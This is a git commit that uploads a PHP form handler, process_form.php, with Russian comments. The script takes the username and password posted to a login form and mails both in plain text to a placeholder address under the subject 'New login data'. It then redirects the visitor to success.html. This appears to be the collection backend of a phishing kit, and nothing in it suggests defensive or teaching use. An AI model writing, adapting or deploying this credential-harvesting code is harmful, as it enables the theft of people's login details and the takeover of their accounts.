93371c09d6f86a99b0502821df76832311b81bce
nakil2 <135464234+nakil2@users.noreply.github.com>
2023-06-03 22:47:18 +0300

    Add files via upload

---
+++ process_form.php
@@ -0,0 +1,19 @@
+
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+  $username = $_POST["username"];
+  $password = $_POST["password"];
+  
+  // Пример отправки почты
+  $to = "ваш_адрес_почты@example.com";
+  $subject = "Новые данные входа";
+  $message = "Логин: " . $username . "\nПароль: " . $password;
+  $headers = "From: ezeil5408@gmail.com";
+  
+  mail($to, $subject, $message, $headers);
+  
+  // Перенаправление пользователя на другую страницу
+  header("Location: success.html");
+  exit();
+}
+?>
